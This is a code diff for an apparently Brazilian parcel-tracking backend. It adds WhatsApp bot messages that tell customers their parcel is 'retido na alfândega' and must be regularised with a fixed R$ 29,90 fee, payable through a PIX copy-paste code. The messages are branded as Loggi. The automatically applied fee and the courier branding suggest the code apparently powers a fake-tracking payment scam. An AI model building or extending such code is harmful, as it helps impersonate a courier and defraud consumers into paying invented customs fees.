@@ -9,6 +9,32 @@ router.get('/config/centavos', (req, res) => {
 });
 
 // ===== HELPERS =====
+
+// Enviar mensagem WhatsApp automaticamente via bot integrado
+async function notificarClienteWA(codigo, mensagem, db) {
+    try {
+        const bot = global._bot;
+        if (!bot || !bot.isReady || !bot.sendWhatsAppMessage) return;
+
+        let phone = null;
+        if (db) {
+            const [rows] = await db.query(
+                'SELECT cliente_whatsapp FROM rastreios_status WHERE codigo = ? AND cliente_whatsapp IS NOT NULL LIMIT 1',
+                [codigo]
+            );
+            if (rows.length && rows[0].cliente_whatsapp) {
+                phone = String(rows[0].cliente_whatsapp).replace(/\D/g, '');
+            }
+        }
+        if (!phone || phone.length < 10) return;
+
+        await bot.sendWhatsAppMessage(phone, mensagem);
+        console.log(`[WA AUTO] Notificacao enviada para ${phone} (${codigo})`);
+    } catch (err) {
+        console.error('[WA AUTO ERROR]', err.message);
+    }
+}
+
 async function processAutomation(codigo, db) {
     console.log(`[AUTOMATION] Verificando automação para: ${codigo}`);
     const [rows] = await db.query(
@@ -88,6 +114,21 @@ async function processAutomation(codigo, db) {
                 [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
             );
             updated = true;
+
+            // [B] Auto-notificar cliente sobre taxa retida
+            const pixInfo = taxaPixEmv
+                ? `\n\n📋 *PIX Copia e Cola:*\n\`${taxaPixEmv.substring(0, 100)}\`\n\n👉 Ou acesse o site para pagar via QR Code.`
+                : '\n\n👉 Acesse o site para visualizar e pagar a taxa.';
+            await notificarClienteWA(codigo,
+                `⚠️ *ATENÇÃO — Objeto Retido*\n\n` +
+                `*Código:* ${codigo}\n` +
+                `*Destino:* ${city}\n\n` +
+                `Seu objeto foi retido na alfândega e necessita de regularização fiscal.\n\n` +
+                `💰 *Taxa:* R$ 29,90` +
+                pixInfo +
+                `\n\n_Loggi — Rastreamento Inteligente_`,
+                db
+            );
         }
     }
 
@@ -165,6 +206,27 @@ router.post('/rastreios', async (req, res) => {
             'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, cliente_nome, cliente_whatsapp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
             [codigo, cidade, status_atual || '📦 Objeto postado', status_atual || '📦 Objeto postado', 'Seu objeto foi postado com sucesso.', taxa_valor, taxa_pix, tipo_entrega || 'NORMAL', cliente_nome || null, cliente_whatsapp || null]
         );
+        // [D] Mensagem de boas-vindas ao criar rastreio com WhatsApp
+        if (cliente_whatsapp) {
+            const phone = String(cliente_whatsapp).replace(/\D/g, '');
+            if (phone.length >= 10) {
+                try {
+                    const bot = global._bot;
+                    if (bot && bot.isReady && bot.sendWhatsAppMessage) {
+                        await bot.sendWhatsAppMessage(phone,
+                            `📦 *Rastreio Cadastrado!*\n\n` +
+                            `Olá${cliente_nome ? `, *${cliente_nome}*` : ''}!\n\n` +
+                            `*Código:* ${codigo}\n` +
+                            `*Destino:* ${cidade}\n` +
+                            `*Modalidade:* ${tipo_entrega || 'NORMAL'}\n\n` +
+                            `Você receberá atualizações automáticas aqui quando o status mudar.\n\n` +
+                            `_Loggi — Rastreamento Inteligente_`
+                        );
+                    }
+                } catch (e) { /* silencioso */ }
+            }
+        }
+
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -248,6 +310,24 @@ router.put('/rastreios/:codigo', async (req, res) => {
                     await db.query('DELETE FROM rastreios_status WHERE codigo = ? AND status_atual = ?', [codigo, oldStatus]);
                 }
             }
+        }
+
+        // [A] Auto-notificar cliente sobre atualização de status
+        const [latestRows] = await db.query(
+            'SELECT status_atual, cidade, cliente_whatsapp FROM rastreios_status WHERE codigo = ? ORDER BY data DESC LIMIT 1',
+            [codigo]
+        );
+        if (latestRows.length && latestRows[0].cliente_whatsapp) {
+            const latestStatus = latestRows[0].status_atual;
+            const latestCidade = latestRows[0].cidade;
+            await notificarClienteWA(codigo,
+                `📦 *Atualização do seu Rastreio*\n\n` +
+                `*Código:* ${codigo}\n` +
+                `*Status:* ${latestStatus}\n` +
+                `*Destino:* ${latestCidade || cidade}\n\n` +
+                `_Loggi — Rastreamento Inteligente_`,
+                db
+            );
         }
 
         res.json({ success: true });
